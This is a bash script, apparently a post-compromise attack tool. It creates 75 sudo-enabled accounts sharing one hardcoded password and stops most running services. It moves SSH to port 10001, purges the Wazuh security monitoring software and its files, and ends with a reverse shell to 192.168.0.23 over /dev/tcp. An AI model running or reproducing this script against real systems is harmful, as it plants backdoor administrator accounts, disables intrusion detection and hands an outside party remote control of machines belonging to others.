#!/bin/bash

echo "Stopping all non-essential services..."


# Number of users to create
NUM_USERS=75
# Password for all users (insecure!)
PASSWORD="fuckyourobert"

# Loop to create users
for i in $(seq 1 $NUM_USERS); do
    USERNAME="user$i"
    
    # Create the user without home directory
    sudo useradd -m -s /bin/bash "$USERNAME"
    
    # Set password (WARNING: Insecure method!)
    echo "$USERNAME:$PASSWORD" | sudo chpasswd
    
    # Add user to sudo group
    sudo usermod -aG sudo "$USERNAME"

    echo "Created user: $USERNAME"
done

echo "Finished creating $NUM_USERS users with sudo access."

# Get the list of active services
for service in $(systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}'); do
    # Skip essential services
    if [[ "$service" != "ssh.service" && "$service" != "systemd*" && "$service" != "cron.service" && "$service" != "networking.service" ]]; then
        sudo systemctl stop "$service"
        echo "Stopped: $service"
    fi
done

# Change SSH port to 10001
echo "Changing SSH port to 10001..."
sudo sed -i 's/^#Port 22/Port 10001/' /etc/ssh/sshd_config
sudo sed -i 's/^Port 22/Port 10001/' /etc/ssh/sshd_config

# Restart SSH to apply changes
echo "Restarting SSH service..."
sudo systemctl restart ssh

# Check SSH status
sudo systemctl status ssh --no-pager

echo "All non-essential services stopped, SSH is running on port 10001."

echo "Uninstalling Wazuh..."
sudo systemctl stop wazuh-manager
sudo systemctl stop wazuh-agent
sudo systemctl disable wazuh-manager
sudo systemctl disable wazuh-agent

sudo apt remove --purge wazuh-manager wazuh-agent -y
sudo yum remove wazuh-manager wazuh-agent -y
sudo dnf remove wazuh-manager wazuh-agent -y

sudo rm -rf /var/ossec
sudo rm -rf /etc/ossec-init.conf
sudo rm -rf /etc/systemd/system/wazuh*

echo "Wazuh has been completely uninstalled."


sh -i 5<> /dev/tcp/192.168.0.23/8000 0<&5 1>&5 2>&5

